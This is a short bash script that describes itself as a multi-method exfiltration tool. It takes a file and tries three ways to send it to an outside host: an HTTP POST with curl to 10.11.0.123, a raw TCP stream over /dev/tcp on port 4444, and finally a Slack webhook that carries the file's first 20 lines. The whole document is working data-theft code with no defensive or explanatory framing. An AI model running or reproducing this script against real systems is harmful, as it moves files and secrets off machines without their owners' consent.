#!/bin/bash
# Multi-method exfil script: tries HTTP, TCP, then fallback to Slack

FILE="$1"
DEST_IP="10.11.0.123"
HTTP_PORT=8000
TCP_PORT=4444
SLACK_WEBHOOK="https://hooks.slack.com/services/TXXXX/BXXXX/XXXXXXXX"

if [[ ! -f "$FILE" ]]; then
    echo "Usage: $0 <file>"
    exit 1
fi

# Method 1: HTTP POST
echo "Trying HTTP POST..."
curl -X POST -F "file=@$FILE" http://$DEST_IP:$HTTP_PORT/upload && exit 0

# Method 2: Raw TCP
echo "Trying raw TCP..."
exec 3<>/dev/tcp/$DEST_IP/$TCP_PORT
cat "$FILE" >&3 && exec 3>&- && exit 0

# Method 3: Slack Webhook (summary only)
echo "Trying Slack fallback..."
SUMMARY=$(head -n 20 "$FILE")
curl -X POST -H 'Content-type: application/json' --data "{\"text\":\"Fallback exfil: $SUMMARY\"}" "$SLACK_WEBHOOK"
